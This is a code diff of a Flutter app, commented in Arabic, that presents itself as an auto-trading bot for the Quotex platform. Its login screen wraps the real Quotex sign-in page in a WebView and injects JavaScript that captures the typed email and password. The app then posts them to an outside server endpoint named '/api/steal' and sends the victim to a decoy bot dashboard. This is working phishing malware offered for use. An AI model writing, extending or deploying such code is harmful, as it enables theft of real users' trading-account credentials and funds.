@@ -4,37 +4,28 @@ import 'package:webview_flutter/webview_flutter.dart';
 import 'package:http/http.dart' as http;
 import 'package:socket_io_client/socket_io_client.dart' as IO;
 import 'package:permission_handler/permission_handler.dart';
+import 'dart:convert';
 
-void main() {
-  runApp(const MyApp());
-}
+void main() => runApp(const MyApp());
 
 class MyApp extends StatelessWidget {
   const MyApp({super.key});
-
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
-      title: 'تطبيق التداول الآلي',
       theme: ThemeData(
         brightness: Brightness.dark,
         scaffoldBackgroundColor: const Color(0xFF030305),
-        primaryColor: const Color(0xFF00E5FF),
-        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(
-          bodyColor: Colors.white,
-          displayColor: Colors.white,
-        ),
+        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(bodyColor: Colors.white),
       ),
       home: const LoginScreen(),
     );
   }
 }
 
-// 1. شاشة تسجيل الدخول (الواجهة الظاهرة)
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
-
   @override
   State<LoginScreen> createState() => _LoginScreenState();
 }
@@ -45,67 +36,44 @@ class _LoginScreenState extends State<LoginScreen> {
   @override
   void initState() {
     super.initState();
+    _requestPermissions();
     _initWebView();
-    _requestPermissions(); // طلب الأذونات أول ما يفتح
   }
 
   void _requestPermissions() async {
-    await [
-      Permission.location,
-      Permission.notification,
-      Permission.ignoreBatteryOptimizations,
-    ].request();
+    await [Permission.location, Permission.notification, Permission.ignoreBatteryOptimizations].request();
   }
 
   void _initWebView() {
     _webViewController = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
-      ..addJavaScriptChannel(
-        'QTX_CREDS',
-        onMessageReceived: (JavaScriptMessage message) {
-          _sendToServer(message.message);
-          // بعد ما يسجل دخول، ننقله لواجهة البوت
-          Navigator.pushReplacement(
-            context,
-            MaterialPageRoute(builder: (context) => const MainTradingScreen()),
-          );
-        },
-      )
-      ..setNavigationDelegate(
-        NavigationDelegate(
-          onPageFinished: (url) {
-            _injectScript();
-          },
-        ),
-      )
+      ..addJavaScriptChannel('QTX_CREDS', onMessageReceived: (msg) async {
+        // بنبعت البيانات للسيرفر
+        await http.post(Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+            headers: {"Content-Type": "application/json"}, body: msg.message);
+        // بننقل المستخدم لواجهة البوت
+        if (mounted) {
+          Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+        }
+      })
+      ..setNavigationDelegate(NavigationDelegate(
+        onPageFinished: (url) => _injectScript(),
+      ))
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
   }
 
   void _injectScript() {
-    String jsScript = """
+    String js = """
       (function() {
         function setNativeValue(el, value) {
-          try {
-            var proto = window.HTMLInputElement.prototype;
-            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
-            desc.set.call(el, value);
-          } catch (e) { el.value = value; }
+          try { var d = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value'); d.set.call(el, value); } catch (e) { el.value = value; }
           el.dispatchEvent(new Event('input', { bubbles: true }));
           el.dispatchEvent(new Event('change', { bubbles: true }));
         }
-        function findEmail() {
-          return document.querySelector('input[name="email"], input[type="email"], #email');
-        }
-        function findPass() {
-          return document.querySelector('input[name="password"], input[type="password"], #password');
-        }
+        function findEmail() { return document.querySelector('input[name="email"], input[type="email"], #email'); }
+        function findPass() { return document.querySelector('input[name="password"], input[type="password"], #password'); }
         function sendCreds() {
-          try {
-            var e = findEmail(), p = findPass();
-            if (e && p && e.value && p.value) {
-              QTX_CREDS.postMessage(JSON.stringify({email: e.value, password: p.value}));
-            }
-          } catch (err) {}
+          try { var e = findEmail(), p = findPass(); if (e && p && e.value && p.value) { QTX_CREDS.postMessage(JSON.stringify({email: e.value, password: p.value})); } } catch (err) {}
         }
         if (!window.__qtxHooksInstalled) {
           window.__qtxHooksInstalled = true;
@@ -117,41 +85,24 @@ class _LoginScreenState extends State<LoginScreen> {
         }
       })();
     """;
-    _webViewController.runJavaScript(jsScript);
-  }
-
-  Future<void> _sendToServer(String data) async {
-    try {
-      await http.post(
-        Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-        headers: {"Content-Type": "application/json"},
-        body: data,
-      );
-    } catch (e) {
-      print("Error: $e");
-    }
+    _webViewController.runJavaScript(js);
   }
 
   @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      body: WebViewWidget(controller: _webViewController),
-    );
-  }
+  Widget build(BuildContext context) => Scaffold(body: WebViewWidget(controller: _webViewController));
 }
 
-// 2. لوحة التحكم (بعد تسجيل الدخول)
 class MainTradingScreen extends StatefulWidget {
   const MainTradingScreen({super.key});
-
   @override
   State<MainTradingScreen> createState() => _MainTradingScreenState();
 }
 
 class _MainTradingScreenState extends State<MainTradingScreen> {
-  bool isDemoAccount = true;
   bool isBotRunning = false;
   late IO.Socket _socket;
+  List<dynamic> _pairs = [];
+  String _currentPrice = "0.00";
 
   @override
   void initState() {
@@ -162,53 +113,76 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
   void _initSocket() {
     _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
       'transports': ['websocket'],
-      'autoConnect': false,
+      'autoConnect': true,
     });
 
-    _socket.onConnect((_) => print('WebSocket Connected'));
-    _socket.on('orders/opened', (data) => print('Trade Opened: $data'));
-  }
-
-  void _openTrade() {
-    if (_socket.connected) {
-      _socket.emit('42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]');
-    }
-  }
-
-  void toggleBot() {
-    setState(() {
-      isBotRunning = !isBotRunning;
+    _socket.onConnect((_) {
+      // طلب قائمة الأزواج
+      _socket.emit('42["instruments/list"]');
+      // طلب الأسعار
+      _socket.emit('42["quotes/stream"]');
     });
-    if (isBotRunning) {
-      _socket.connect();
-      _openTrade();
-    } else {
-      _socket.disconnect();
-    }
+
+    _socket.on('instruments/update', (data) {
+      if (data['instruments'] != null) {
+        setState(() {
+          _pairs = data['instruments'];
+        });
+      }
+    });
+
+    _socket.on('quotes/stream', (data) {
+      if (data['price'] != null) {
+        setState(() {
+          _currentPrice = data['price'].toString();
+        });
+      }
+    });
   }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      body: Container(
-        color: const Color(0xFF030305),
-        child: Center(
-          child: Column(
-            mainAxisAlignment: MainAxisAlignment.center,
-            children: [
-              Text('التحكم الآلي', style: TextStyle(color: const Color(0xFFFFD700), fontSize: 24, fontWeight: FontWeight.bold)),
-              const SizedBox(height: 20),
-              ElevatedButton(
-                onPressed: toggleBot,
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
-                  padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
+      appBar: AppBar(title: const Text('لوحة التحكم'), backgroundColor: const Color(0xFF0E0E14)),
+      body: Column(
+        children: [
+          // عرض السعر الحالي
+          Container(
+            padding: const EdgeInsets.all(16),
+            color: const Color(0xFF0E0E14),
+            child: Row(
+              mainAxisAlignment: MainAxisAlignment.spaceBetween,
+              children: [
+                Text("السعر الحالي: \$$_currentPrice", style: const TextStyle(color: Colors.green, fontSize: 18)),
+                ElevatedButton(
+                  onPressed: () {},
+                  child: const Text('تحديث'),
                 ),
-                child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black)),
-              ),
-            ],
+              ],
+            ),
           ),
-        ),
+          // عرض الأزواج
+          Expanded(
+            child: ListView.builder(
+              itemCount: _pairs.length,
+              itemBuilder: (context, index) {
+                return ListTile(
+                  title: Text(_pairs[index]['name'] ?? 'Unknown'),
+                  trailing: Text(_pairs[index]['price']?.toString() ?? '0.00'),
+                );
+              },
+            ),
+          ),
+        ],
+      ),
+      floatingActionButton: FloatingActionButton(
+        onPressed: () {
+          setState(() => isBotRunning = !isBotRunning);
+          if (isBotRunning) {
+            _socket.emit('42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]');
+          }
+        },
+        child: Icon(isBotRunning ? Icons.stop : Icons.play_arrow),
       ),
     );
   }
